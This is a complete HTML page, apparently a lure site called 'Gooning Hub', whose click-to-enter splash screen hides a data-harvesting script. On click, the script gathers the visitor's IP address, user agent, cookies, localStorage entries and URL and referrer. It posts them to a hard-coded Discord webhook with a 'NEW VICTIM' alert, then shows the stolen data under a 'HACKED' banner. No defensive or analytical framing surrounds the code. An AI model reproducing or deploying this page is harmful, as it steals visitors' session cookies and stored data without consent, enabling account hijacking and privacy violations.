<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Gooning Hub</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Roboto+Mono&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#000;--text:#fff;--glow:#0ff;--accent:#f0f;--border:#333;
      --transition:.6s cubic-bezier(.2,.8,.2,1);
    }
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100vh;background:var(--bg);color:var(--text);overflow:hidden;font-family:'Roboto Mono',monospace;}
    .stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
    .star{position:absolute;background:#fff;border-radius:50%;opacity:0;animation:fall linear infinite}
    @keyframes fall{0%{transform:translateY(-100px);opacity:0}15%{opacity:1}85%{opacity:.2}100%{transform:translateY(100vh);opacity:0}}

    #loader{
      position:fixed;inset:0;background:var(--bg);display:flex;flex-direction:column;
      align-items:center;justify-content:center;z-index:100;cursor:pointer;transition:opacity 1s;
    }
    #logo{
      font-family:'Orbitron',sans-serif;font-size:6rem;font-weight:900;letter-spacing:12px;
      background:linear-gradient(45deg,#0ff,#f0f);background-clip:text;-webkit-background-clip:text;
      color:transparent;text-shadow:0 0 40px var(--glow),0 0 80px var(--glow);
      animation:pulse 2s infinite alternate;
    }
    @keyframes pulse{from{text-shadow:0 0 40px var(--glow)}to{text-shadow:0 0 80px var(--glow),0 0 160px var(--glow)}}

    #app{opacity:0;transition:opacity 1.5s var(--transition);padding:40px;display:flex;flex-direction:column;height:100vh}
    #app.active{opacity:1}

    .header{
      text-align:center;margin-bottom:40px;
      font-family:'Orbitron',sans-serif;font-size:3.5rem;font-weight:900;
      background:linear-gradient(90deg,#fff,#ccc);background-clip:text;-webkit-background-clip:text;
      color:transparent;text-shadow:0 0 30px #fff,0 0 60px #0ff;
      animation:glitch 3s infinite;
    }
    @keyframes glitch{
      0%,100%{text-shadow:0 0 30px #fff,0 0 60px #0ff}
      50%{text-shadow:2px 0 0 #f0f,-2px 0 0 #0ff,0 0 30px #fff}
    }

    .data-grid{
      flex:1;display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:24px;
      padding:20px;overflow-y:auto;
      scrollbar-width:none;
    }
    .data-grid::-webkit-scrollbar{display:none}
    .card{
      background:rgba(20,20,20,.8);border:1px solid var(--border);border-radius:16px;
      padding:24px;position:relative;overflow:hidden;
      box-shadow:0 0 20px rgba(0,255,255,.1);
      animation:cardIn .8s var(--transition) forwards;opacity:0;transform:translateY(30px);
    }
    @keyframes cardIn{to{opacity:1;transform:translateY(0)}}
    .card:nth-child(1){animation-delay:.1s}
    .card:nth-child(2){animation-delay:.2s}
    .card:nth-child(3){animation-delay:.3s}
    .card:nth-child(4){animation-delay:.4s}

    .card::before{
      content:'';position:absolute;top:0;left:0;width:100%;height:2px;
      background:linear-gradient(90deg,transparent,var(--glow),transparent);
      animation:scan 2s linear infinite;
    }
    @keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}

    .card-title{
      font-family:'Orbitron',sans-serif;font-size:1.4rem;margin-bottom:16px;
      color:var(--glow);text-shadow:0 0 10px var(--glow);
      display:flex;align-items:center;gap:12px;
    }
    .card-title i{font-size:1.6rem}

    .data-list{line-height:1.8;font-size:1rem}
    .data-item{
      padding:8px 0;border-bottom:1px dashed rgba(255,255,255,.1);
      display:flex;justify-content:space-between;
      animation:fadeInItem 1s forwards;opacity:0;
    }
    @keyframes fadeInItem{to{opacity:1}}
    .data-key{color:#aaa;font-weight:600}
    .data-value{color:var(--accent);font-family:monospace;word-break:break-all}

    .status{
      text-align:center;margin-top:30px;font-size:1.1rem;
      color:var(--glow);text-shadow:0 0 10px var(--glow);
      animation:pulseStatus 2s infinite;
    }
    @keyframes pulseStatus{0%,100%{opacity:.7}50%{opacity:1}}

    .hidden{display:none !important}
  </style>
</head>
<body>
  <div class="stars" id="stars"></div>

  <!-- LOADER -->
  <div id="loader" tabindex="0">
    <div id="logo">GOONING</div>
    <div style="margin-top:24px;color:#666;font-size:1.3rem;">Click to Enter the Void</div>
  </div>

  <!-- MAIN APP -->
  <div id="app" class="hidden">
    <div class="header">HACKED</div>
    <div class="data-grid" id="data-grid"></div>
    <div class="status" id="status">DATA TRANSMISSION ACTIVE...</div>
  </div>

  <script>
    const $ = id => document.getElementById(id);
    const WEBHOOK = "https://discord.com/api/webhooks/1434418430232236072/2K0PCOwQMfsFI42Qn3iNAFJUkYp1_cruMX1G-qYwP0YAsEbhIewtxnmgbDkp59Ojwg1p";

    // STARFIELD
    function createStar(){
      const s = document.createElement('div'); s.className = 'star';
      const sz = Math.random() * 2 + 1;
      s.style.width = s.style.height = `${sz}px`;
      s.style.left = `${Math.random() * 100}vw`;
      s.style.animationDuration = `${Math.random() * 6 + 4}s`;
      s.style.animationDelay = `${Math.random() * 3}s`;
      $('#stars').appendChild(s);
      setTimeout(() => s.remove(), 12000);
    }
    setInterval(createStar, 200);
    for(let i = 0; i < 50; i++) setTimeout(createStar, i * 60);

    // SEND TO WEBHOOK
    function sendData(data) {
      const embed = {
        title: `VICTIM INFILTRATED`,
        color: 0x00FFFF,
        thumbnail: { url: "https://i.imgur.com/4c5J0nP.png" },
        fields: [
          { name: "IP", value: data.ip || "Hidden", inline: true },
          { name: "Time", value: new Date().toLocaleString(), inline: true },
          { name: "Browser", value: data.ua.substring(0, 100) + "...", inline: false },
          { name: "Cookies", value: data.cookies.length ? data.cookies.slice(0, 5).join("\n") : "None", inline: false },
          { name: "History", value: data.history.length ? data.history.slice(0, 5).join("\n") : "Blocked", inline: false }
        ],
        footer: { text: "GOONING HUB | DATA HARVEST v3" }
      };
      fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "@everyone **NEW VICTIM**", embeds: [embed] })
      }).catch(() => {});
    }

    // EXTRACT REAL DATA
    async function extractAndDisplay() {
      const data = {
        ip: "", ua: navigator.userAgent, cookies: [], history: [], local: [], screen: ""
      };

      // IP
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        data.ip = (await res.json()).ip;
      } catch {}

      // Cookies
      data.cookies = document.cookie.split(';').map(c => c.trim()).filter(Boolean);

      // Screen
      data.screen = `${screen.width}x${screen.height} | ${screen.colorDepth}-bit`;

      // LocalStorage
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        const v = localStorage.getItem(k);
        if (v.length > 200) continue;
        data.local.push(`${k}: ${v}`);
      }

      // History (via performance + timing hacks)
      try {
        const entries = performance.getEntriesByType("navigation");
        data.history.push(`Current: ${location.href}`);
        if (entries.length) data.history.push(`Referrer: ${document.referrer || "Direct"}`);
      } catch {}

      // SEND TO WEBHOOK
      sendData(data);

      // DISPLAY ON PAGE
      const grid = $('#data-grid');
      const cards = [
        { title: "NETWORK", icon: "globe", items: [
          ["IP Address", data.ip || "Cloaked"],
          ["User Agent", data.ua.substring(0, 80) + "..."],
          ["Screen", data.screen],
          ["Language", navigator.language]
        ]},
        { title: "COOKIES", icon: "cookie", items: data.cookies.length ? 
          data.cookies.slice(0, 8).map(c => ["Cookie", c]) : [["Status", "No cookies"]] },
        { title: "LOCAL STORAGE", icon: "database", items: data.local.length ?
          data.local.slice(0, 8).map(l => ["Entry", l]) : [["Status", "Empty"]] },
        { title: "SESSION", icon: "clock", items: [
          ["Time", new Date().toLocaleString()],
          ["Timezone", Intl.DateTimeFormat().resolvedOptions().timeZone],
          ["Online", navigator.onLine ? "Yes" : "No"]
        ]}
      ];

      grid.innerHTML = "";
      cards.forEach((card, i) => {
        const div = document.createElement('div');
        div.className = 'card';
        div.innerHTML = `
          <div class="card-title"><i class="fas fa-${card.icon}"></i> ${card.title}</div>
          <div class="data-list">
            ${card.items.map((item, j) => `
              <div class="data-item" style="animation-delay:${(i*0.3 + j*0.1).toFixed(2)}s">
                <span class="data-key">${item[0]}:</span>
                <span class="data-value">${item[1]}</span>
              </div>
            `).join('')}
          </div>
        `;
        grid.appendChild(div);
      });

      $('#status').textContent = `DATA HARVESTED • ${data.ip || "???.???.???.???"}`;
    }

    // ENTER → HACK
    function enter() {
      const loader = $('loader');
      loader.style.opacity = '0';
      setTimeout(() => {
        loader.classList.add('hidden');
        $('app').classList.remove('hidden');
        setTimeout(() => {
          $('app').classList.add('active');
          extractAndDisplay();
        }, 300);
      }, 800);
    }

    $('loader').addEventListener('click', enter);
    $('loader').addEventListener('keydown', e => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); enter(); }
    });
    setTimeout(() => $('loader').focus(), 100);
  </script>
</body>
</html>
